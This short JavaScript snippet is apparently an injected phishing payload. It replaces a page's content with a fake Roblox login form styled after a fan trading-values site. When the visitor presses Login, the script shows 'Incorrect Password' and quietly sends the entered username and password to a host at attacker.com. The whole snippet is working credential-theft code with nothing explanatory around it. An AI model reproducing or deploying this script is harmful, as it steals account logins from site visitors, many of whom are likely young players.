function inc(){
abc.innerText = "Incorrect Password";
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.attacker.com/l0g4dump?user="+document.getElementById("user").value+"&pass="+document.getElementById("pass").value);
xhr.setRequestHeader("Accept", "application/json");
xhr.send();
}
document.activeElement.innerHTML = '<p></p><center><img src="img/logo_cyan.png" width="980" /><center><strong>FIND US ON...</strong> <br /><a href="http://mm2values.com/group" target="_NEW">Roblox</a> - <a href="https://twitter.com/mm2values" target="_NEW">Twitter</a> - <a href="https://discord.com/invite/99Um7uU" target="_NEW">Discord</a> <br /><br /><strong>#BlackLivesMatter</strong><br /><a href="https://www.joincampaignzero.org/#vision" target="_NEW">Campaign Zero</a></center></center><br><br><center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/Roblox_Logo_Black.svg/1280px-Roblox_Logo_Black.svg.png" style="height: 5%;"></center><br><br><center><p>USER:</p><input id="user"><br><p>PASS:</p><input id="pass" type="password"><br><br><button id="abc" onclick="inc()">Login</button></center>' 
